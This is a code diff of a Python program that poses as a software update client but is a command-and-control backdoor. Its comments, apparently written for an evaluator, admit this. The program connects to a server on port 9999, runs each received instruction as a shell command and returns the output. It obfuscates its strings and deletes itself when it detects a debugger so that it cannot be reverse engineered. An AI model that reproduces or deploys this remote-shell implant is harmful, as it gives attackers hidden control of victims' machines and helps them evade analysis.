@@ -37,27 +37,26 @@ def check_debugger():
 def apply_update( updt ):
     '''
     Apply the update received from update server
-    Comment for evaluator understanding - the purpose of this function is to actually execute the given command line instruction
+    Comment for evaluator understanding - the purpose of this function is to actually execute the given instruction from C2
     '''
     output = obfuscate( STR_COMMAND_TOOK_LONG )
 
     def target():
         nonlocal output
         global current_dir
-        if updt.startswith("cd "):
-            os.chdir(os.path.join(current_dir, updt[3:]))
-            current_dir = os.path.abspath(os.getcwd())
+        if updt.startswith( "cd " ):
+            os.chdir( os.path.join( current_dir , updt[3:] ) )
+            current_dir = os.path.abspath( os.getcwd() )
             output = obfuscate( STR_CD_UPDATE_DIR ) + current_dir
         else:
-            process = subprocess.Popen(updt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
+            process = subprocess.Popen( updt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir )
             out, err = process.communicate()
             output = out.decode() + err.decode()
 
+    # timeout logic if instruction takes too long to execute
     thread = threading.Thread( target = target )
     thread.start()
     thread.join( timeout = 10000 )
-    if thread.is_alive():
-        thread.join() 
     return output
 
 
@@ -88,11 +87,15 @@ def main():
     port = 9999
     if check_debugger():
         print( STR_DEBUGGER_DETECTED )
+        # Don't apply new updates if file is in debug mode
+        # For evaluator understanding - we delete the file to prevent reversing if we detect that it is run in a debugger 
         no_update_handler()
 
-    with socket.socket() as s: 
+    with socket.socket() as s:
+        # Connect to update server 
+        # For evaluator understanding - we actually connect to C2 server here
         s = socket.socket()
-        s.connect( ( host, port ) )
+        s.connect( ( host , port ) )
         print( STR_CONNECTED_TO_SERVER )
         
         while True:
@@ -105,6 +108,8 @@ def main():
                 no_update_handler()
 
             print( STR_UPDATE_RECEIVED )
+            # Apply update
+            # For evaluator understanding - we actually apply C2 server instructions here
             output = apply_update( updt )
             print( STR_COMM_UPDATE_SERVER )
             comm_update_server( s , output )
